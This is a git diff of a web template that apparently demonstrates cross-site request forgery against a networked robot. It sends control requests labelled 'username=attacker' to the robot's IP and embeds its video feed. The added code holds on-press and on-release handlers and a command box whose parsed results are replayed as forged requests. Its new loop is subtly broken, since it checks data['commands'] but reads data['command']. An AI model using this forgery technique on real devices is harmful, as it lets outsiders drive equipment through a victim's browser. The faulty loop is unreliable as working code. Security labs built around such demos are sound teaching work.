@@ -7,16 +7,26 @@
 
 <script type="text/javascript">
 $( document ).ready(function() {
-    $("#up").click(()=>{send_csrf("up")});
-    $("#down").click(()=>{send_csrf("down")});
-    $("#left").click(()=>{send_csrf("left")});
-    $("#right").click(()=>{send_csrf("right")});
+    $("#up").mousedown(()=>{send_csrf("up")});
+    $("#down").mousedown(()=>{send_csrf("down")});
+    $("#left").mousedown(()=>{send_csrf("left")});
+    $("#right").mousedown(()=>{send_csrf("right")});
     $("#beep").click(()=>{send_csrf("beep")});
     $("#stop").click(()=>{send_csrf("stop")});
     $("#reset").click(()=>{send_csrf("reset")});
+
+    $("#up").mouseup(()=>{send_csrf("stop")});
+    $("#down").mouseup(()=>{send_csrf("stop")});
+    $("#left").mouseup(()=>{send_csrf("stop")});
+    $("#right").mouseup(()=>{send_csrf("stop")});
+    $("#submit").mouseup(()=>{
+        var commands = $("#commands").val()
+        send_complex_commands(commands)
+    });
 });
 
 function send_csrf(command){
+    // trivial commands
 	var request = new XMLHttpRequest();
 	var params = "username=attacker";
 	request.open('GET', "http://<%= robot_ip %>:3000/control/"+command, true);
@@ -26,6 +36,30 @@ function send_csrf(command){
 	request.setRequestHeader("Connection", "close");
 	request.send(params);
 }
+
+function send_complex_commands(commands){
+    console.log(commands);
+    fetch("/api/parseaction", {
+        credentials: 'same-origin',
+        method: 'POST',
+        body: JSON.stringify({
+            text: commands,
+        }),
+        headers: {"Content-Type": "application/json"},
+    })
+    .then((response) => {
+        if (!response.ok) throw Error(response.statusText);
+        return response.json();
+    })
+    .then((data) => {
+        console.log(data)
+        for (let i = 0; i < data["commands"]; i++){
+            send_csrf(data["command"][i])
+        }
+    })
+    .catch(error => console.log(error));
+}
+
 </script>
 
 <div class="container">
@@ -37,9 +71,17 @@ function send_csrf(command){
 	<button id="beep" class="btn btn-primary">beep</button>
 	<button id="stop" class="btn btn-primary">stop</button>
 	<button id="reset" class="btn btn-primary">reset</button>
+    <form>
+        <div class="form-group" style="width:50%">
+          <input type="text" class="form-control" id="commands" placeholder="input commands" name="commands">
+        </div>
+    </form>
+    <button id="submit" class="btn btn-primary">submit</button>
+
 	<div>
 	    <a href="/"><p>Back to home</p>
 	</div>
 	<iframe style="width:700px;height:500px;" frameborder="0" src="http://<%= robot_ip %>:3000/video_feed"></iframe>
+
 </div>
 
